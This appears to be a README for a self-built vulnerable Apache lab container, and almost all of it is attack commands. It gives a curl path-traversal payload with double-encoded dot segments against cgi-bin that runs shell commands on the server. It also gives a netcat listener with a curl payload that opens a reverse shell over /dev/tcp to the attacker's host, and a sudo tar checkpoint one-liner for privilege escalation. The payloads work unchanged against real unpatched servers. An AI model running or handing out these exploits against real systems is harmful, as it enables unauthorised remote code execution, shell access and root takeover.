# Build and start the vulnerable docker :
`chmod +x ./build.sh`
`./build.sh`

# Obtain a shell from the docker :
`docker exec -it apache-vuln /bin/bash`

# RCE via Apache server :
`curl -s --path-as-is 'http://<IP>:4444/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`

# Reverse shell via Apache Server :
## Step 1 :
  On your host, set up a listener :
`nc -nvlp <port>`
## Step2 :
  On your host, use curl to execute code on the Apache Server :
`curl -s --path-as-is 'http://<IP>:4444/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; bash -c "/bin/sh -i >& /dev/tcp/<your host IP>/<your listener port> 0>&1"'`

# Privesc
`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
